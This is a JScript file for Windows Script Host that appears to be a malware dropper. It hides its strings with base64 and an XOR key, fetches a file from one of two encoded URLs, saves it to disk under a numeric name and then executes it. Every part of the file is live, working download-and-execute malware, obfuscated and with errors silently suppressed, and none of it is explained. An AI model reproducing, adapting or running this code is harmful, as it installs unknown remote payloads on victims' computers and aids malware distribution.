var decode = function (packedText) {
    var cipher ="U5WIGyWUfzYntB6G";

    var Base64 = {
        _keyStr: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",

        decode: function (input) {
            var output = "";
            var chr1, chr2, chr3;
            var enc1, enc2, enc3, enc4;
            var i = 0;

            input = input.replace(/[^A-Za-z0-9\+\/\=]/g, "");

            while (i < input.length) {

                enc1 = this._keyStr.indexOf(input.charAt(i++));
                enc2 = this._keyStr.indexOf(input.charAt(i++));
                enc3 = this._keyStr.indexOf(input.charAt(i++));
                enc4 = this._keyStr.indexOf(input.charAt(i++));

                chr1 = (enc1 << 2) | (enc2 >> 4);
                chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);
                chr3 = ((enc3 & 3) << 6) | enc4;

                output = output + String.fromCharCode(chr1);

                if (enc3 != 64) {
                    output = output + String.fromCharCode(chr2);
                }
                if (enc4 != 64) {
                    output = output + String.fromCharCode(chr3);
                }

            }

            output = Base64._utf8_decode(output);

            return output;

        },
        _utf8_decode: function (utftext) {
            var string = "";
            var i = 0;
            var c = c1 = c2 = 0;

            while (i < utftext.length) {

                c = utftext.charCodeAt(i);

                if (c < 128) {
                    string += String.fromCharCode(c);
                    i++;
                }
                else if ((c > 191) && (c < 224)) {
                    c2 = utftext.charCodeAt(i + 1);
                    string += String.fromCharCode(((c & 31) << 6) | (c2 & 63));
                    i += 2;
                }
                else {
                    c2 = utftext.charCodeAt(i + 1);
                    c3 = utftext.charCodeAt(i + 2);
                    string += String.fromCharCode(((c & 15) << 12) | ((c2 & 63) << 6) | (c3 & 63));
                    i += 3;
                }

            }
            return string;
        }
    };

    var text = Base64.decode(packedText);

    var cipherLength = cipher.length;
    var result = "";
    for (var i = 0; i < text.length; i++) {
        result += String.fromCharCode(text.charCodeAt(i) ^ cipher.charCodeAt(i % cipherLength));
    }
    return result;
};
(function() {
    var unfalteringzQ5 = 200;
    var gripeeKr = decode('"EnAD"');
    var perspicuousNLf = decode('"EE0yKg=="');
    var modegIm = decode('"AmY0Oy4JI3s1EjwCGA=="');
    var homilynrs = decode('"GGYPBAtLeQ0rNhE6IBI="');
    var unctionMHQ = decode('"FHEYDQU="');
    var bouillonOpA = decode('"BkElLCYU"');
    var substantialGHW = decode('"cGESBBdcCw=="');
    var sybariteyh3 = decode('"e1AvLA=="');
    var puckerPYT = 2e5;
    var derelictSvz = [ decode('"PUEjOX1WeD0DFjUBAy1EKzFEJjhpGjg4SUJpQBE6Uw=="'), decode('"PUEjOX1WeCISHDAdEy1fKTJdMjsiHzF7BRU0QUxyGCItUA=="') ];
    var fiascoU4E = 524288;
    var redoubtableCEf = WScript.CreateObject(modegIm);
    var contriveVpD = WScript.CreateObject(homilynrs);
    var unimpeachableApe = WScript.CreateObject(unctionMHQ + decode('"ew=="') + bouillonOpA);
    var brookmbB = redoubtableCEf.ExpandEnvironmentStrings(substantialGHW);
    var afflictw5w = brookmbB + fiascoU4E + sybariteyh3;
    var pendulousIyQ = false;
    for (var modestFIa = 0; modestFIa < derelictSvz.length; modestFIa++) {
        try {
            var gistiHl = derelictSvz[modestFIa];
            contriveVpD.open(gripeeKr, gistiHl, false);
            contriveVpD.send();
            if (contriveVpD.status == unfalteringzQ5) {
                try {
                    unimpeachableApe.open();
                    unimpeachableApe.type = 1;
                    unimpeachableApe.write(contriveVpD.responseBody);
                    if (unimpeachableApe.size > puckerPYT) {
                        modestFIa = derelictSvz.length;
                        unimpeachableApe.position = 0;
                        unimpeachableApe.saveToFile(afflictw5w, 2);
                        pendulousIyQ = true;
                    }
                } finally {
                    unimpeachableApe.close();
                }
            }
        } catch (ignored) {}
    }
    if (pendulousIyQ) {
        redoubtableCEf[perspicuousNLf](brookmbB + Math.pow(2, 19));
    }
})();